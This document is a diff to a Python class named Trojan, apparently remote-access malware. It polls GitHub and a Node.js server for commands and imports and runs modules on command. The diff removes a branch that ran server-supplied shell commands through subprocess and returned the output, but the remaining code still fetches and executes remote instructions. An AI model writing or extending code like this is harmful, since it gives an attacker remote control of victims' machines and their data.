@@ -84,19 +84,11 @@ class Trojan:
                 module_name = command.get('module')
                 if module_name:
                     if module_name not in sys.modules:
-                        # Assuming modules are dynamically imported
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
         else:
-            # Handle as a shell command if command is a string
-            try:
-                print(f"[*] Executing command: {command}")  # Debug output
-                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                result = result.decode('utf-8')
-            except subprocess.CalledProcessError as e:
-                result = e.output.decode('utf-8')
-            self.send_command_result(command, result)
+            print(f"Invalid command format: {command}")
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -110,10 +102,7 @@ class Trojan:
 
     def run(self):
         while self.running:
-            # Fetch configuration from GitHub
             github_config = self.get_github_config()
-
-            # Fetch real-time commands from Node.js server
             nodejs_config = self.get_nodejs_config()
 
             if nodejs_config:
@@ -122,7 +111,6 @@ class Trojan:
                     self.update_status("Trojan stopped.")
                     break
 
-                # Execute commands from Node.js server
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
